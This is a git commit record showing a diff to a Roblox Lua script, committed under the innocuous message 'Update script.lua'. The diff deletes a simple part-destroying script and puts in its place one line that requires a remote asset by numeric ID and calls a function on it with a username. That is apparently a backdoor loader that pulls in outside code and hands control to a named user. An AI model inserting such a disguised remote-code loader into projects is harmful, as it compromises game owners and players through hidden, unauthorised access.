b9cb108ece490477f0b5bcd898463879bc8d1da6
bailey923 <151684237+bailey923@users.noreply.github.com>
2025-07-14 19:49:23 -0300

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,9 +1,1 @@
-local model = script.Parent  -- the model this script is inside of
-local part = model:FindFirstChild("Part")  -- change "Part" to your part's name
-
-if part then
-    part:Destroy()
-else
-    warn("Part not found in model!")
-end
-print("The part has been destroy!")
+require(4867426485):SD2("Nickeymagic")
